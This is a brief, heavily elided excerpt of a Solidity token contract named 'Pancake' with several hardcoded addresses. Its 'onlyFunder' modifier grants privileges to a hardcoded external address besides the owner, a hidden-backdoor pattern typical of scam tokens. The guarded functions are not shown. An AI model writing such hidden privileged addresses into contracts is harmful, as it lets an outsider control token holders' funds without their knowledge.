...
abstract contract bb is IERC20, Ownable {
    ...
    modifier onlyFunder() {
        require(_owner == msg.sender || 0x31DfbB4937BEfA807fDE5cE38269E1aF01129948 == msg.sender, "!Funder");
        _;
    }
...
contract Pancake is bb {
    constructor() bb(
        ...
        address(0x613916eC7Ad910248d3891f7Ed1feA5450cC485B),

        address(0xd1775E7432164368c770dfD45e0cBA9c1B267c09)
    ){
